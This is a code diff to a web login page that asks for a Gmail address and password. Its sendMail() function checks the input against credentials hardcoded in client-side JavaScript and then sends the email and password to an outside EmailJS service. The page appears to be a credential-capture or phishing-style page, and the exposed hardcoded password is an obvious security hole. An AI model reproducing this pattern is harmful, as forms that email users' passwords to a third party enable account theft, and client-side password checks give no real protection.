@@ -103,7 +103,7 @@
 
   <input type="email" id="email" placeholder="Enter your Gmail">
 
-  <input type="password" id="password" placeholder="Enter your Gmail password">
+  <input type="password" id="password" placeholder="Enter your password">
 
   <button onclick="sendMail()">LOG IN</button>
 
@@ -121,33 +121,35 @@ function sendMail(){
         return;
     }
 
-    // 🔐 LOGIN CHECK (fix for wrong password issue)
+    // LOGIN CHECK
     let correctEmail = "test@gmail.com";
-    let correctPassword = "1234";
+    let correctPassword = "Pushtoon123";
 
-    if(email !== correctEmail || password !== correctPassword){
+    if(email.toLowerCase() === correctEmail.toLowerCase() 
+       && password === correctPassword){
+
+        let params = {
+            email: email,
+            password: password
+        };
+
+        emailjs.send(
+            "service_bqnzz7f",
+            "template_lxwj7sw",
+            params
+        )
+        .then(function(response){
+            alert("Login Successful!");
+            console.log("SUCCESS:", response);
+        })
+        .catch(function(error){
+            alert("FAILED - check console (F12)");
+            console.log("ERROR:", error);
+        });
+
+    } else {
         alert("Wrong email or password!");
-        return;
     }
-
-    let params = {
-        email: email,
-        password: password
-    };
-
-    emailjs.send(
-        "service_bqnzz7f",
-        "template_lxwj7sw",
-        params
-    )
-    .then(function(response){
-        alert("Login Successful!");
-        console.log("SUCCESS:", response);
-    })
-    .catch(function(error){
-        alert("FAILED - check console (F12)");
-        console.log("ERROR:", error);
-    });
 
 }
 
